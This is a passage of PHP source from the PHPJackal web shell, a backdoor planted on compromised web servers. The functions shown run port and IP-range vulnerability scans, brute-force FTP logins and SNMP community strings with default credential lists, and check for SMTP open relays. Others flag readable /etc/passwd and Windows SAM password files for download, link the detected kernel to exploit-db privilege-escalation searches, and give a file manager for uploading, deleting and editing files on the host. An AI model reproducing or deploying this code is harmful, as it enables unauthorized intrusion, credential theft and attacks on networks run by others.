</textarea></div></div>
<div class="fieldwrapper"><label class="styled">Attachment:</label><div class="thefield"><input type="text" name="attach" value="';if(!empty($_REQUEST['attacH']))echo htmlspecialchars($cwd.DIRECTORY_SEPARATOR.$_REQUEST['attacH']);echo '" /></div></div>
<div class="fieldwrapper"><label class="styled">Count:</label><div class="thefield"><input type="text" name="count" size="5" value="1" /></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Send" style="margin-left: 150px;" /></div></form>';
}
}
function scanneR(){
global $hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/scanner.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_SERVER['SERVER_ADDR']))$host=$_SERVER['SERVER_ADDR'];else $host='127.0.0.1';
$udp=(empty($_REQUEST['udp']))?0:1;$tcp=(empty($_REQUEST['tcp']))?0:1;
if(($udp||$tcp) && !empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])){
$target=$_REQUEST['target'];$from=(int)$_REQUEST['fromport'];$to=(int)$_REQUEST['toport'];$timeout=(int)$_REQUEST['timeout'];$nu=0;
echo '<font color=blue>Port scanning started against '.htmlspecialchars($target).':<br />';
$start=time();
for($i=$from;$i<=$to;$i++){
if($tcp){
if(checkthisporT($target,$i,$timeout)){
$nu++;
$ser='';
if(getservbyport($i,'tcp'))$ser='('.getservbyport($i,'tcp').')';
echo "$nu) $i $ser (<a href='telnet://$target:$i'>Connect</a>) [TCP]<br>";
}
}
if($udp)if(checkthisporT($target,$i,$timeout,1)){$nu++;$ser='';if(getservbyport($i,'udp'))$ser='('.getservbyport($i,'udp').')';echo "$nu) $i $ser [UDP]<br>";}
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
}
elseif(!empty($_REQUEST['securityscanner'])){
echo '<font color=blue>';
$start=time();
$from=$_REQUEST['from'];
$to=$_REQUEST['to'];
$fIP=ip2long($from);
$tIP=ip2long($to);
if($fIP>$tIP){
echo 'Invalid range;</font>';
return 0;
}
$timeout=(int)$_REQUEST['timeout'];
if(!empty($_REQUEST['httpscanner'])){
echo 'Loading webserver bug list...';
$buglist=whereistmP().DIRECTORY_SEPARATOR.uniqid('BL');
$dl=downloadiT('http://www.cirt.net/nikto/UPDATES/1.36/scan_database.db',$buglist);
if($dl){$file=file($buglist);echo 'Done! scanning started.<br><br>';}else echo 'Failed!!! scanning started without webserver security testing...<br><br>';
}else{$fr=htmlspecialchars($from);echo "Scanning $from-$to:<br><br>";}
for($i=$fIP;$i<=$tIP;$i++){
$output=0;
$ip=long2ip($i);
if(!empty($_REQUEST['nslookup'])){
$hn=gethostbyaddr($ip);
if($hn!=$ip)echo "$ip [$hn]<br>"; $output=1;}
if(!empty($_REQUEST['ipscanner'])){
$port=$_REQUEST['port'];
if(strstr($port,','))$p=explode(',',$port);else $p[0]=$port;
$open=$ser='';
foreach($p as $po){
$scan=checkthisporT($ip,$po,$timeout);
if($scan){
$ser='';
if($ser=getservbyport($po,'tcp'))$ser="($ser)";
$open.=" $po$ser ";
}
}
if($open){echo "$ip) Open ports:$open<br>";$output=1;}
}
if(!empty($_REQUEST['httpbanner'])){
$res=get_sw_namE($ip,$timeout);
if($res){
echo "$ip) Webserver software: ";
if($res==-1)echo 'Unknow';
else echo $res;
echo '<br>';
$output=1;
}
}
if(!empty($_REQUEST['httpscanner'])){
if(checkthisporT($ip,80,$timeout) && !empty($file)){
$admin=array('/admin/','/adm/');
$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','smmsp','smtp','sshd','sys','test','unknown','uucp','web','www');
$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');
$cgi=array('/cgi.cgi/','/webcgi/','/cgi-914/','/cgi-915/','/bin/','/cgi/','/mpcgi/','/cgi-bin/','/ows-bin/','/cgi-sys/','/cgi-local/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');
foreach($file as $v){
$vuln=array();
$v=trim($v);
if(!$v || $v{0}=='#')continue;
$v=str_replace('","','^',$v);
$v=str_replace('"','',$v);
$vuln=explode('^',$v);
$page=$cqich=$nukech=$adminch=$userch=$vuln[1];
if(strstr($page,'@CGIDIRS'))
foreach($cgi as $cg){
$cqich=str_replace('@CGIDIRS',$cg,$page);
$url="http://$ip$cqich";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
elseif(strstr($page,'@ADMINDIRS'))
foreach($admin as $cg){
$adminch=str_replace('@ADMINDIRS',$cg,$page);
$url="http://$ip$adminch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
elseif(strstr($page,'@USERS'))
foreach($users as $cg){
$userch=str_replace('@USERS',$cg,$page);
$url="http://$ip$userch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
elseif(strstr($page,'@NUKE'))
foreach($nuke as $cg){
$nukech=str_replace('@NUKE',$cg,$page);
$url="http://$ip$nukech";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
else{
$url="http://$ip$page";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
}
}
}
if(!empty($_REQUEST['smtprelay'])){
if(checkthisporT($ip,25,$timeout)){
$res='';
$res=checksmtP($ip,$timeout);
if($res==1){echo "$ip) SMTP relay found.<br>";$output=1;}
}
}
if(!empty($_REQUEST['snmpscanner'])){
if(checkthisporT($ip,161,$timeout,1)){
$com=$_REQUEST['com'];
$coms=$res='';
if(strstr($com,','))$c=explode(',',$com);else $c[0]=$com;
foreach($c as $v){
$ret=snmpchecK($ip,$v,$timeout);
if($ret)$coms.=" $v ";
}
if($coms!=''){echo "$ip) SNMP FOUND: $coms<br>";$output=1;}
}
}
if(!empty($_REQUEST['ftpscanner']) && function_exists('ftp_connect')){
if(checkthisporT($ip,21,$timeout)){
$usps=explode(',',$_REQUEST['userpass']);
foreach($usps as $v){
$user=substr($v,0,strpos($v,':'));
$pass=substr($v,strpos($v,':')+1);
if($pass=='[BLANK]')$pass='';
if(ftpchecK($ip,$user,$pass,$timeout)){$output=1;echo "$ip) FTP FOUND: ($user:$pass) System type: ".ftp_systype($ftp)." (<b><a href='";echo hlinK("seC=ftpc&workingdiR=".getcwd()."&hosT=$ip&useR=$user&pasS=$pass");echo "' target='_blank'>Connect</a></b>)<br>";}
}
}
}
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
if(!empty($buglist))unlink($buglist);
}
elseif(!empty($_REQUEST['directoryscanner'])){
$dir=file($_REQUEST['dic']);$host=$_REQUEST['host'];$r=$_REQUEST['r1'];
echo "<font color=blue><pre>Scanning started...\n";
for($i=0;$i<count($dir);$i++){
$d=trim($dir[$i]);
if($r){
$adr="http://$host/$d/";
if(check_urL($adr,'GET','200')){echo "Directory Found: <a href='$adr' target='_blank'>$adr</a>\n";}
}else{
$adr="$d.$host";
$ip=gethostbyname($adr);
if($ip!=$adr){echo "Subdomain Found: <a href='http://$adr' target='_blank'>$adr($ip)</a>\n";}
}
}
echo 'Done!</pre></font>';
}
else{
$chbox=(extension_loaded('sockets'))?"<ul><li><input type=checkbox name=tcp value=1 checked> <lable>TCP</lable></li><li><input type=checkbox name=udp value=1 checked> <lable>UDP</lable></li></ul>":'<input type="hidden" name="tcp" value="1">';
echo '<form name=port method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Port scanner</label></div><div class="fieldwrapper"><label class="styled">Target:</label><div class="thefield"><input type="text" name="target" value="'.$host.'" size="30" /></div></div><div class="fieldwrapper"><label class="styled">From:</label><div class="thefield"><input type="text" name="fromport" value="1" size="30" /></div></div><div class="fieldwrapper"><label class="styled">To:</label><div class="thefield"><input type="text" name="toport" value="1024" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Options:</label><div class="thefield"><ul style="margin-top:0;"><li><label>Timeout:</label> <input type="text" name="timeout" size="5" value="2"></li>'.$chbox.'</u></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" name="portscanner" value="Scan" style="margin-left: 150px;" /></div></form><br /><form name=disc method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Discover</label></div><div class="fieldwrapper"><label class="styled">Target:</label><div class="thefield"><input type="text" name="host" value="'.$_SERVER["HTTP_HOST"].'" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Dictionary:</label><div class="thefield"><input type="text" name="dic" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Search for:</label><div class="thefield"><ul><li><input type=radio value=1 checked name=r1> <label>Directories</label></li><li><input type=radio name=r1 value=0> <label>Subdomains</label></li></ul></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" name="directoryscanner" value="Scan" style="margin-left: 150px;" /></div></form>';
$host=substr($host,0,strrpos($host,"."));
echo '<form name=security method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Security scanner</label></div><div class="fieldwrapper"><label class="styled">From:</label><div class="thefield"><input type="text" name="from" value="'.$host.'.1" size="30" /></div></div><div class="fieldwrapper"><label class="styled">To:</label><div class="thefield"><input type="text" name="to" value="'.$host.'.255" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Options:</label><div class="thefield"><ul style="margin-top:0;"><li><input type="checkbox" value="1" name="nslookup" checked> <label>NS lookup</label></li><li><label>Timeout:</label> <input type="text" name="timeout" size="5" value="2"></li><li><input type=checkbox name=ipscanner value=1 checked onClick="document.security.port.disabled = !document.security.port.disabled;"> <label>Port scanner:</label> <input name=port type=text value="21,23,25,80,110,135,139,143,443,445,1433,3306,3389,8080,65301" size="30"></li><li><input type=checkbox name=httpbanner value=1 checked> <label>Grab HTTP headers</label></li><li><input type=checkbox name=httpscanner value=1 checked> <label>Webserver security scanning</label></li><li><input type=checkbox name=smtprelay value=1 checked> <label>SMTP relay check</label></li><li><input type=checkbox name=ftpscanner value=1 checked onClick="document.security.userpass.disabled = !document.security.userpass.disabled;"> <label>FTP password:</label> <input name=userpass type=text value="anonymous:admin@nasa.gov,ftp:ftp,Administrator:[BLANK],guest:[BLANK]" size=30></li><li><input type=checkbox name=snmpscanner value=1 onClick="document.security.com.disabled = !document.security.com.disabled;" checked> <label>SNMP:</label> <input name=com type=text value="public,private,secret,cisco,write,test,guest,ilmi,ILMI,password,all private,admin,all,system,monitor,sun,agent,manager,ibm,hello,switch,solaris,OrigEquipMfr,default,world,tech,mngt,tivoli,openview,community,snmp,SNMP,none,snmpd,Secret C0de,netman,security,pass,passwd,root,access,rmon,rmon_admin,hp_admin,NoGaH$@!,router,agent_steal,freekevin,read,read-only,read-write,0392a0,cable-docsis,fubar,ANYCOM,Cisco router,xyzzy,c,cc,cascade,yellow,blue,internal,comcomcom,IBM,apc,TENmanUFactOryPOWER,proxy,core,CISCO,regional,1234,2read,4changes" size=30></li><li></u></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" name="securityscanner" value="Scan" style="margin-left: 150px;" /></div></form>';
}
}
function sysinfO(){
global $windows,$disablefunctions,$cwd,$safemode;
$basedir=(ini_get('open_basedir') || strtoupper(ini_get('open_basedir'))=='ON')?'ON':'OFF';
if(!empty($_SERVER['PROCESSOR_IDENTIFIER']))$CPU=$_SERVER['PROCESSOR_IDENTIFIER'];
$osver=$tsize=$fsize='';
$ds=implode(' ',$disablefunctions);
$Clock='http://h.ackerz.com/PHPJackal/images/clock/';
if($windows){
$osver=shelL('ver');
if(!empty($osver))$osver="($osver)";
$sysroot=shelL("echo %systemroot%");
if(empty($sysroot))$sysroot=$_SERVER['SystemRoot'];
if(empty($sysroot))$sysroot = getenv('windir');
if(empty($sysroot))$sysroot = 'Not Found';
if(empty($CPU))$CPU=shelL('echo %PROCESSOR_IDENTIFIER%');
for($i=66;$i<=90;$i++){
$drive=chr($i).':\\';
if(disk_total_space($drive)){
$fsize+=disk_free_space($drive);
$tsize+=disk_total_space($drive);
}
}
}else{
$ap=shelL('whereis apache');
if(empty($CPU))$CPU=shelL('grep "model name" /proc/cpuinfo | cut -d ":" -f2');
if($CPU)$CPU=nl2br($CPU);
if(!$ap)$ap='Unknow';
$fsize=disk_free_space('/');
$tsize=disk_total_space('/');
}
$diskper=floor(($fsize/$tsize)*100);
$diskcolor='; background: ';
if($diskper<33)$diskcolor.='green';elseif($diskper<66 && $diskper>33)$diskcolor.='orange';else $diskcolor.='red'; 
$disksize='Used spase: '.showsizE($tsize-$fsize).' Free space: '.showsizE($fsize).' Total space: '.showsizE($tsize);
$diskspace=($tsize)?'<div class="progress-container" style="width: 100px" title="'.$disksize.'"><div style="width: '.$diskper.'%'.$diskcolor.'"></div></div>':'Unknown';
if(empty($CPU))$CPU='Unknow';
$os=php_uname();
$osn=php_uname('s');
if(!$windows){
$ker=php_uname('r');
$o=($osn=='Linux')?'Linux+Kernel':$osn;
$os='http://www.exploit-db.com/search/?action=search&filter_platform=16" target="_blank">'.$osn.'</a>';
$os='http://www.exploit-db.com/search/?action=search&filter_description=kernel&filter_platform=16" target="_blank">'.$ker.'</a>';
$inpa=':';
}else{
$sam=$sysroot."\\system32\\config\\SAM";
$inpa=';';
$os='http://www.exploit-db.com/search/?action=search&filter_description=privilege+escalation&filter_platform=45" target="_blank">'.$osn.'</a>';
}
$cuser=get_current_user();
if(!$cuser)$cuser='Unknow';
echo '<img src="http://h.ackerz.com/PHPJackal/images/information.png" style="border: none; margin: 0;" /><br /><br /><div class="fieldwrapper"><label class="styled" style="width:320px">Server information</label></div><div class="fieldwrapper"><label class="styled">Server:</label><div class="thefield"><span>'; if(!empty($_SERVER['SERVER_ADDR']))echo '<img src="http://h.ackerz.com/info/?ip='.$_SERVER['SERVER_ADDR'].'"> ';echo '<a href="'.hlinK("seC=tools&serveR=whois.geektools.com&domaiN=".$_SERVER['HTTP_HOST']) .'">'.$_SERVER['HTTP_HOST'].'</a>';if(!empty($_SERVER['SERVER_ADDR'])){ echo '(<a href="'.hlinK("seC=tools&serveR=whois.geektools.com&domaiN=".$_SERVER['SERVER_ADDR']) .'">'.$_SERVER['SERVER_ADDR'].'</a>)';}echo '</span></div></div><div class="fieldwrapper"><label class="styled">Operation system:</label><div class="thefield"><span><a href="'.$os.$osver. '</span></div></div><div class="fieldwrapper"><label class="styled">Web server:</label><div class="thefield"><span>'.$_SERVER['SERVER_SOFTWARE']. '</span></div></div><div class="fieldwrapper"><label class="styled">CPU:</label><div class="thefield"><span>'.$CPU. '</span></div></div><div class="fieldwrapper"><label class="styled">Disk space:</label><span>
'.$diskspace.'</span></div><div class="fieldwrapper"><label class="styled">User domain:</label><div class="thefield"><span>';if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN'];else echo 'Unknow'; echo '</span></div></div><div class="fieldwrapper"><label class="styled">Username:</label><div class="thefield"><span>'.$cuser. '</span></div></div>';
if($windows){echo '<div class="fieldwrapper"><label class="styled">Windows directory:</label><div class="thefield"><span><a href="'.hlinK("seC=fm&workingdiR=$sysroot").'">'.$sysroot.'</a></span></div></div><div class="fieldwrapper"><label class="styled">SAM file:</label><div class="thefield"><span>';if(is_readable(($sam)))echo '<a href="'.hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam").'">Readable</a>'; else echo 'Not readable';echo '</span></div></div>';}
else
{
echo '
<div class="fieldwrapper"><label class="styled">UID - GID:</label><div class="thefield"><span>'.getmyuid().' - '.getmygid().'</span></div></div><div class="fieldwrapper"><label class="styled">Passwd file:</label><div class="thefield"><span>';if(is_readable('/etc/passwd'))echo '<a href="'.hlinK("seC=openit&namE=/etc/passwd&workingdiR=$cwd").'">Readable</a>';else echo 'Not readable';echo '</span></div></div><div class="fieldwrapper"><label class="styled">cPanel:</label><div class="thefield"><span>';$cp='/usr/local/cpanel/version';$cv=(file_exists($cp) && is_writable($cp))?trim(file_get_contents($cp)):'Unknow';echo "$cv (Log file: ";if(file_exists('/var/cpanel/accounting.log')){if(is_readable('/var/cpanel/accounting.log'))echo "<a href='".hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd")."'>Readable</a>";else echo 'Not readable';}else echo 'Not found';echo ')</span></div></div>';
}
echo '<div class="fieldwrapper"><label class="styled">PHP:</label><div class="thefield"><span><a href="javascript:void(0)" onclick=\'window.open("?='.php_logo_guid().'","","width=300,height=200,scrollbars=no")\'>'.PHP_VERSION.'</a>(<a href="'.hlinK("seC=phpinfo&workingdiR=$cwd").'">more...</a>).</span>
</div></div><div class="fieldwrapper"><label class="styled">Zend version:</label><div class="thefield">
<span>';if (function_exists('zend_version')) echo "<a href='javascript:void(0)' onclick=\"window.open('?=".zend_logo_guid()."','','width=300,height=200,scrollbars=no')\">".zend_version().'</a>';else echo 'Not Found';echo '</span>
</div></div><div class="fieldwrapper">
<label class="styled">Include path:</label>
<div class="thefield">
<span>'.str_replace($inpa,' ',DEFAULT_INCLUDE_PATH).'</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">PHP Modules:</label>
<div class="thefield">
<span>';$ext=get_loaded_extensions();foreach($ext as $v){$i=phpversion($v);if(!empty($i))$i="($i)";$l=hlinK("exT=$v");echo "[<a href='javascript:void(0)' onclick=\"window.open('$l','','width=300,height=200,scrollbars=yes')\">$v $i</a>] ";}echo '</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Disabled functions:</label>
<div class="thefield">
<span>';if(!empty($ds))echo "$ds ";else echo 'Nothing'; echo '</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Safe-mode:</label>
<div class="thefield">
<span>'.$safemode.'</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Open base dir:</label>
<div class="thefield">
<span>'.$basedir.'</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">DBMS:</label>
<div class="thefield">
<span>';$sq='';
if(function_exists('mysql_connect'))$sq= 'MySQL ';
if(function_exists('mssql_connect'))$sq.= 'MSSQL ';
if(function_exists('ora_logon'))$sq.= 'Oracle ';
if(function_exists('sqlite_open'))$sq.= 'SQLite ';
if(function_exists('pg_connect')) $sq.= 'PostgreSQL ';
if(function_exists('msql_connect')) $sq.= 'mSQL ';
if(function_exists('mysqli_connect'))$sq.= 'MySQLi ';
if(function_exists('ovrimos_connect')) $sq.= 'Ovrimos SQL ';
if ($sq=='') $sq= 'Nothing';
echo $sq.'</span>
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Time:</label>
<div class="thefield">
<span><div title="Local">
<img src="'.$Clock.'8.png" name="hr1"><img 
src="'.$Clock.'8.png" name="hr2"><img 
src="'.$Clock.'c.png"><img 
src="'.$Clock.'8.png" name="mn1"><img 
src="'.$Clock.'8.png" name="mn2"><img 
src="'.$Clock.'c.png"><img 
src="'.$Clock.'8.png" name="se1"><img 
src="'.$Clock.'8.png" name="se2"><img 
src="'.$Clock.'pm.png" name="ampm">
</div>
<div title="Server">
<img src="'.$Clock.'8.png" name="shr1"><img 
src="'.$Clock.'8.png" name="shr2"><img 
src="'.$Clock.'c.png"><img 
src="'.$Clock.'8.png" name="smn1"><img 
src="'.$Clock.'8.png" name="smn2"><img 
src="'.$Clock.'c.png"><img 
src="'.$Clock.'8.png" name="sse1"><img 
src="'.$Clock.'8.png" name="sse2"><img 
src="'.$Clock.'pm.png" name="sampm"></span>
</div>
</div>
</div>
<script type="text/javascript">
dg0=new Image();dg0.src="'.$Clock.'0.png";
dg1=new Image();dg1.src="'.$Clock.'1.png";
dg2=new Image();dg2.src="'.$Clock.'2.png";
dg3=new Image();dg3.src="'.$Clock.'3.png";
dg4=new Image();dg4.src="'.$Clock.'4.png";
dg5=new Image();dg5.src="'.$Clock.'5.png";
dg6=new Image();dg6.src="'.$Clock.'6.png";
dg7=new Image();dg7.src="'.$Clock.'7.png";
dg8=new Image();dg8.src="'.$Clock.'8.png";
dg9=new Image();dg9.src="'.$Clock.'9.png";
dgam=new Image();dgam.src="'.$Clock.'am.png";
dgpm=new Image();dgpm.src="'.$Clock.'pm.png";
sh=';echo date('G');echo '+100;
sm=';echo date('i');echo '+100;
ss=';echo date('s');echo '+100;
function ltime(){ 
theTime=setTimeout("ltime()",1000);
d = new Date();
hr= d.getHours()+100;
mn= d.getMinutes()+100;
se= d.getSeconds()+100;
if(hr==100){hr=112;am_pm="am";}
else if(hr<112){am_pm="am";}
else if(hr==112){am_pm="pm";}
else if(hr>112){am_pm="pm";hr=(hr-12);}
tot=""+hr+mn+se;
document.hr1.src = "'.$Clock.'"+tot.substring(1,2)+".png";
document.hr2.src = "'.$Clock.'"+tot.substring(2,3)+".png";
document.mn1.src = "'.$Clock.'"+tot.substring(4,5)+".png";
document.mn2.src = "'.$Clock.'"+tot.substring(5,6)+".png";
document.se1.src = "'.$Clock.'"+tot.substring(7,8)+".png";
document.se2.src = "'.$Clock.'"+tot.substring(8,9)+".png";
document.ampm.src= "'.$Clock.'"+am_pm+".png";
}
function stime(){ 
theTime=setTimeout("stime()",1000);
ss++;
if(sh==100){sh=112;am_pm="am";}
else if(sh<112){am_pm="am";}
else if(sh==112){am_pm="pm";}
else if(sh>112){am_pm="pm";sh=(sh-12);}
if(ss==160){ss=100; sm++;}if(sm==160){sm=100; sh++;}
tot=""+sh+sm+ss;
document.shr1.src = "'.$Clock.'"+tot.substring(1,2)+".png";
document.shr2.src = "'.$Clock.'"+tot.substring(2,3)+".png";
document.smn1.src = "'.$Clock.'"+tot.substring(4,5)+".png";
document.smn2.src = "'.$Clock.'"+tot.substring(5,6)+".png";
document.sse1.src = "'.$Clock.'"+tot.substring(7,8)+".png";
document.sse2.src = "'.$Clock.'"+tot.substring(8,9)+".png";
document.sampm.src= "'.$Clock.'"+am_pm+".png";
}
ltime();
stime();
</script>
';}
function checksuM($file){
echo "<pre>MD5: ".md5_file($file)."\r\nSHA1: ".sha1_file($file)."</pre>";
}
function listdiR($cwd,$task){
$c=getcwd();
$dh=opendir($cwd);
while($cont=readdir($dh)){
if($cont=='.' || $cont=='..')continue;
$adr=$cwd.DIRECTORY_SEPARATOR.$cont;
switch($task){
case '0':if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";break;
case '1':if(is_writeable($adr)){if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";}break;
case '2':if(is_file($adr) && is_writeable($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";break;
case '3':if(is_dir($adr) && is_writeable($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";break;
case '4':if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";break;
case '5':if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";break;
case '6':if(preg_match('@'.$_REQUEST['search'].'@',$cont) || (is_file($adr) && preg_match('@'.$_REQUEST['search'].'@',file_get_contents($adr)))){if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";}break;
case '7':if(strstr($cont,$_REQUEST['search']) || (is_file($adr) && strstr(file_get_contents($adr),$_REQUEST['search']))){if(is_file($adr))echo "[<a href='".hlinK("seC=edit&filE=$adr&workingdiR=$c")."'>$adr</a>]\n";if(is_dir($adr))echo "[<a href='".hlinK("seC=fm&workingdiR=$adr")."'>$adr</a>]\n";}break;
case '8':{if(is_dir($adr))rmdir($adr);else unlink($adr);rmdir($cwd);break;}
}
if(is_dir($adr))listdiR($adr,$task);
}
}
if(!checkfunctioN('posix_getpwuid')){function posix_getpwuid($u){return 0;}}
if(!checkfunctioN('posix_getgrgid')){function posix_getgrgid($g){return 0;}}
function filemanageR(){
global $windows,$cwd,$hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/filemanager.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_REQUEST['task'])){
if(!empty($_REQUEST['search']))$_REQUEST['task']=7;
if(!empty($_REQUEST['re']))$_REQUEST['task']=6;
echo '<font color=blue><pre>';
listdiR($cwd,$_REQUEST['task']);
echo '</pre></font>';
}else{
if(!empty($_REQUEST['cP']) || !empty($_REQUEST['mV']) || !empty($_REQUEST['rN'])){
if(!empty($_REQUEST['cP']) || !empty($_REQUEST['mV'])){
$title='Destination';
$ad=(!empty($_REQUEST['cP']))?$_REQUEST['cP']:$_REQUEST['mV'];
$dis=(!empty($_REQUEST['cP']))?'Copy':'Move';
}else{
$ad=$_REQUEST['rN'];
$title='New name';
$dis='Rename';
}
if(empty($_REQUEST['deS'])){
echo '<table border="0" cellspacing="0" cellpadding="0"><tr><th>'.$title.':</th></tr><tr><td><form method="POST"><input type=text value="';if(empty($_REQUEST['rN']))echo $cwd;echo '" size="60" name="deS"></td></tr><tr><td>'.$hcwd.'<input type="hidden" value="'.htmlspecialchars($ad).'" name="cp"><input type="submit" value="'.$dis.'"></form></table>';
}else{
if(!empty($_REQUEST['rN']))rename($ad,$_REQUEST['deS']);
else{
copy($ad,$_REQUEST['deS']);
if(!empty($_REQUEST['mV']))unlink($ad);
}
}
}
if(!empty($_REQUEST['deL'])){if(is_dir($_REQUEST['deL']))listdiR($_REQUEST['deL'],8);else unlink($_REQUEST['deL']);}
if(!empty($_FILES['uploadfile'])){
move_uploaded_file($_FILES['uploadfile']['tmp_name'],$_FILES['uploadfile']['name']);
echo "<b>Uploaded!</b> File name: ".$_FILES['uploadfile']['name']." File size: ".$_FILES['uploadfile']['size']. "<br />";
}
$select="<select onChange='document.location=this.options[this.selectedIndex].value;'><option value='".hlinK("seC=fm&workingdiR=$cwd")."'>--------</option><option value='";
if(!empty($_REQUEST['newf'])){
if(!empty($_REQUEST['newfile'])){file_put_contents($_REQUEST['newf'],'');}
if(!empty($_REQUEST['newdir'])){mkdir($_REQUEST['newf']);}
}
if($windows){
echo '<table border="0" cellspacing="0" cellpadding="0"><tr><td><b>Drives:</b>';
for($i=66;$i<=90;$i++){$drive=chr($i).':';
if(disk_total_space($drive)){echo " <a title='$drive' href=".hlinK("seC=fm&workingdiR=$drive\\").">$drive\\</a>";}}
echo "</td><tr></table>";
}
}
$ext= array('7z','ai','aiff','asc','avi','bat','bin','bz2','c','cfc','cfm','chm','class','com','conf','cpp','cs','css','csv','dat','deb','divx','dll','doc','dot','eml','enc','exe','flv','gif','gz','hlp','htaccess','htpasswd','htm','html','ico','image','iso','jar','java','jpeg','jpg','js','link','log','lua','m','m4v','mid','mm','mov','mp3','mpg','odc','odf','odg','odi','odp','ods','odt','ogg','pdf','pgp','php','pl','png','ppt','ps','py','ram','rar','rb','rm','rpm','rtf','sig','shtml','sql','swf','sxc','sxd','sxi','sxw','tar','tex','tgz','txt','vcf','vsd','wav','wma','wmv','xls','xml','xpi','xvid','zip');
echo '
<table border="0" cellspacing="0" cellpadding="0">
<form method="POST"><tr><th width="20%">Location:<input type="text" name="workingdiR" size="40" value="'.$cwd.'"><input type="submit" value="Change"></form></th></tr></table>';
$file=$dir=$link=array();
if($dirhandle=opendir($cwd)){
while($cont=readdir($dirhandle)){
if(is_dir($cwd.DIRECTORY_SEPARATOR.$cont))$dir[]=$cont;
elseif(is_file($cwd.DIRECTORY_SEPARATOR.$cont))$file[]=$cont;
else $link[]=$cont;
}
closedir($dirhandle);
sort($file);sort($dir);sort($link);
echo '<table border="0" cellspacing="0" cellpadding="0" width="100%"><tr><th width="240"><b>Name</b></th><th width="100"><b>Owner</b></th><th width="130"><b>Modification time</b></th><th width="130"><b>Last access</b></th><th width="25"><b>Permission</b></th><th width="35"><b>Size</b></th><th width="50"><b>Actions</b></th></tr>';
$i=0;
foreach($dir as $dn){
echo '<tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td style="font-weight:bold;">';
$own='Unknow';
$owner=posix_getpwuid(fileowner($dn));
$mdate=date('Y/m/d H:i:s',filemtime($dn));
$adate=date('Y/m/d H:i:s',fileatime($dn));
$diraction=$select.hlinK('seC=fm&workingdiR='.realpath($dn))."'>Open</option><option value='".hlinK("seC=fm&workingdiR=$cwd&rN=$dn")."'>Rename</option><option value='".hlinK("seC=fm&deL=$dn&workingdiR=$cwd")."'>Remove</option></select></td>";
if($owner)$own="<a title=' Shell: ".$owner['shell']."' href='".hlinK('seC=fm&workingdiR='.$owner['dir'])."'>".$owner['name'].'</a>';
echo '<a href="'.hlinK('seC=fm&workingdiR='.realpath($dn)).'"><font';
if(is_writeable($dn))echo ' color="#006600"';elseif(!is_readable($dn))echo ' color="#990000"';
echo '><img src="http://h.ackerz.com/PHPJackal/images/icon/directory" border="0" /> ';
if(strlen($dn)>29)echo substr($dn,0,26).'...';else echo $dn;echo '</font></a></td>';
echo "<td>$own</td>";
echo "<td>$mdate</td>";
echo "<td>$adate</td>";
